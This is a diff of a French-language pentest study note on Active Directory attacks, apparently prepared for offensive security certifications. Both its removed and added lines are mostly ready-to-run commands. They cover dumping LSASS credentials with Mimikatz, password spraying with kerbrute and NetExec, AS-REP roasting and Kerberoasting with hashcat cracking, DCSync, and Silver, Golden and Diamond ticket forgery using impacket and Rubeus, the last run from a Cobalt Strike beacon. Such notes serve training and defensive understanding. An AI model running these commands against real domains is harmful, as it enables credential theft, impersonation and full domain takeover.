@@ -1,28 +1,5 @@
 # Théorie
 
-## NTLM
-
-Utilisé quand :
-- Authentification par **IP** (pas par hostname)
-- Hostname non enregistré dans le DNS AD
-- Application tierce qui ne supporte pas Kerberos
-
-**Flux d'authentification (7 étapes)**
-
-1. Le client calcule le **hash NTLM** depuis le mot de passe
-2. Le client envoie le **username** au serveur
-3. Le serveur renvoie un **nonce** (valeur aléatoire = challenge)
-4. Le client chiffre le nonce avec le hash NTLM → **response**
-5. Le serveur transfère username + nonce + response au **DC**
-6. Le DC chiffre le nonce avec le hash NTLM stocké et compare à la response
-7. Si égaux → authentification réussie
-
-![](../ActiveDirectory/img/Pasted%20image%2020260512145336.png)
-
-> NTLM est non-réversible mais rapide à craquer (jusqu'à 600 milliards de hash/s avec GPU haut de gamme). Un mot de passe de 8 caractères peut être cracké en ~2,5h.
-
-## Kerberos
-
 Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** -  le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.
 
 ![](../ActiveDirectory/img/Pasted%20image%2020260512145508.png)
@@ -65,73 +42,13 @@ Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tic
 | **Silver Ticket** | Hash compte de service | Oui | Un seul service | Accès furtif, ne contacte pas le DC |
 | **Golden Ticket** | Hash `krbtgt` | Oui | Tout le domaine | Persistence totale, impersonate n'importe quel user |
 
-## Credentials mis en cache (LSASS)
+---
+# AS-REP Roasting
 
-Les hashes Kerberos (TGT, session keys) et NTLM sont stockés en mémoire dans le processus **LSASS** pour le SSO. Nécessite des droits **SYSTEM ou admin local** pour y accéder.
-
-**Mimikatz -  dump des hashes**
-
-```powershell
-# Depuis un PowerShell élevé (admin)
-cd C:\Tools
-.\mimikatz.exe
-
-privilege::debug                  # activer SeDebugPrivilege
-sekurlsa::logonpasswords          # dump NTLM/SHA1 de tous les users connectés
-sekurlsa::tickets                 # dump TGT et TGS en mémoire
-```
-
-> `sekurlsa::logonpasswords` retourne les hashes NTLM et SHA1. Si WDigest est activé (Windows 7 ou config manuelle), les mots de passe en clair apparaissent aussi.
-
-**Mimikatz -  export/import de tickets Kerberos**
-
-```
-sekurlsa::tickets /export          # exporter les tickets sur disque (.kirbi)
-kerberos::ptt <TICKET.KIRBI>       # injecter un ticket dans LSASS
-```
-
-**Mimikatz -  certificats non-exportables (AD CS)**
-
-```
-crypto::capi                       # patcher CryptoAPI pour rendre les clés exportables
-crypto::cng                        # patcher le service KeyIso
-```
-
-> Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz -  bypass couvert dans PEN-300.
-
-# Attaques
-
-## Password Spraying
-
-**Vérifier la politique de verrouillage avant d'attaquer**
-
-```cmd
-net accounts
-```
-
-Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observation window` (minutes avant réinitialisation du compteur).
-
-> Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 4 tentatives par user. Avec une fenêtre de 30 min, on peut tenter ~192 passwords/24h sans déclencher de lockout.
-
-**SMB avec NetExec**
-
-```bash
-nxc smb 'IP' -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-```
-
-**Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
-
-```bash
-# Linux
-sudo apt update && sudo apt install golang-go --fix-missing
-git clone https://github.com/ropnop/kerbrute.git
-cd kerbrute
-go build -o kerbrute .
-./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
-```
-
-> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.
-## AS-REP Roasting
+> Attaque sur les étapes KRB_AS_REQ et KRB_AS_REP du protocole Kerberos  
+Si un utilisateur possède l’attribut DONT_REQ_PREAUTH dans l’UAC  
+Alors l’envoi du timestamp lors de KRB_AS_REQ n’est pas nécessaire  
+N’importe qui peut forger une demande KRB_AS_REQ pour un utilisateur arbitraire
 
 Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activée, un attaquant peut demander un AS-REP sans s'authentifier → la réponse contient un hash crackable offline.
 
@@ -170,8 +87,8 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 
 > **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis -  il suffit d'ajouter un SPN sans toucher au `userAccountControl`.
 
-## Kerberoasting
-
+---
+# Kerberoasting
 
 > Attaque sur l’étape **KRB\_TGS\_REP**\
 > Nécessite un compte utilisateur sans privilèges particulier\
@@ -210,7 +127,7 @@ impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashe
 hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Kerberoasting via AS-REP Roasting
+## Kerberoasting via AS-REP Roasting
 
 Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes -  sans avoir besoin d'un vrai mot de passe.
 
@@ -231,7 +148,7 @@ GetUserSPNs.py -no-preauth <ASREP_USER> -usersfile services.txt -dc-host <IP_DC>
 .\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<ASREP_USER> /spn:<TARGET_SERVICE>
 ```
 
-### Targeted Kerberoasting
+## Targeted Kerberoasting
 
 Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la cible. Les membres du groupe **Account Operators** ont généralement ces droits.
 
@@ -277,7 +194,8 @@ Set-DomainObject -Identity victimuser -Clear serviceprincipalname
 
 > Toujours supprimer le SPN après exploitation pour ne pas laisser de vulnérabilité dans l'infra.
 
-## Silver Tickets
+---
+# Silver Tickets
 
 Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L'application cible vérifie le ticket localement (chiffré avec le hash du service) sans contacter le DC → accès avec les permissions de son choix.
 
@@ -368,38 +286,95 @@ iwr -UseDefaultCredentials http://web04
 
 > Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine -  empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.
 
-## DCSync
+---
+# Golden Ticket
 
-Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC -  seulement que le SID a les droits requis.
+Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**. Permet de s'attribuer n'importe quels groupes/privilèges (Domain Admins, etc.) pour n'importe quel compte existant. Le DC accepte le ticket car il est chiffré avec la bonne clé.
 
-**Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
+> Prérequis : avoir compromis le DC ou un compte DA pour extraire le hash krbtgt.
+> Durée par défaut : **10 ans** (contrairement aux TGT légitimes à 10h).
+> Utiliser le **hostname** et non l'IP pour forcer Kerberos -  avec l'IP, Windows bascule sur NTLM et l'accès est refusé.
 
-**Depuis Kali (impacket-secretsdump)**
+**Linux**
+
+1. Obtenir le hash krbtgt
+```bash
+# Depuis Kali via DCSync
+impacket-secretsdump -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
+# ou
+nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
+# → noter le hash NTLM de krbtgt
+```
+
+2. Forger et injecter le Golden Ticket
 
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC
+# Obtenir le Domain SID ET le RID du compte cible en une seule commande
+impacket-lookupsid corp.com/'USER':'PASSWORD'@'IP_DC'
+# S-1-5-21-YYY-YYY-YYY-RID
+# Enlever le RID et on obtient le domain-sid
 
-# Dump tous les comptes
-impacket-secretsdump corp.com/jeffadmin:'PASSWORD'@IP_DC
+# Forger le ticket (-user-id obligatoire sur Server 2022+)
+impacket-ticketer -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
+# → génère <USERNAME>.ccache
+
+# Charger et utiliser
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-psexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
+impacket-wmiexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
 ```
 
-**Depuis Kali (NetExec)**
-
-```bash
-nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
-```
-
-**Depuis Windows (Mimikatz)**
+**Windows (Mimikatz)**
 
 ```
-lsadump::dcsync /user:corp\dave
-lsadump::dcsync /user:corp\Administrator
+# Purger les tickets existants
+kerberos::purge
+
+# Forger et injecter le Golden Ticket
+kerberos::golden /user:<USER> /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
+
+# Ouvrir un shell et utiliser (hostname obligatoire, pas IP)
+misc::cmd
 ```
 
-**Cracker le hash NTLM obtenu (mode 1000)**
-
-```bash
-hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```cmd
+PsExec.exe \\DC1 cmd.exe
 ```
 
-> Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).
+# Diamond Tickets
+
+Fonctionnellement, un diamond ticket n'est pas différent d'un TGT forgé - la différence est dans la manière dont il est créé. Un diamond ticket est créé en demandant un TGT légitime pour un utilisateur. Le secret du KDC est ensuite utilisé pour déchiffrer le ticket, où les informations internes (nom du principal, ID, groupes, etc.) peuvent être modifiées. Le ticket est ensuite re-chiffré et re-signé avec le secret du KDC.
+
+L'avantage de cette technique est que toutes les informations périphériques du ticket sont parfaitement conformes à la politique du domaine. Un autre avantage est qu'elle rend la détection basée sur des AS-REQ manquants plus difficile.
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
+```
+
+Où :
+- `/tgtdeleg` utilise l'astuce de délégation du TGT ([TGT delegation trick](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#tgtdeleg)) pour obtenir un TGT utilisable pour l'utilisateur courant sans avoir besoin de credentials.
+- `/krbkey` est le hash AES256 du compte krbtgt.
+- `/ticketuser` est l'utilisateur que l'on veut usurper.
+- `/ticketuserid` est le RID de l'utilisateur usurpé.
+- `/domain` est le domaine courant.
+
+La commande `describe` de Rubeus dispose d'un paramètre `/servicekey` qui déchiffre et affiche le PAC du ticket. En décrivant le premier ticket, on voit qu'il s'agit d'un TGT pour l'utilisateur courant (comme attendu).
+
+```
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIFm[...snip...]kNPTQ==
+```
+
+Le ticket est ensuite déchiffré, modifié, puis re-chiffré. En décrivant le second ticket, on voit qu'il s'agit maintenant d'un TGT pour Administrator.
+
+> Rubeus définit le champ Groups à 520,512,513,519,518 par défaut, mais on peut changer ça avec le paramètre `/groups`.
+
+```
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==
+```
+
+> On remarque que certains champs, comme le FullName, sont toujours ceux du TGT d'origine, ce qui peut constituer un point de détection potentiel.
+
+```
+beacon> make_token CONTOSO\Administrator FakePass
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=
+```
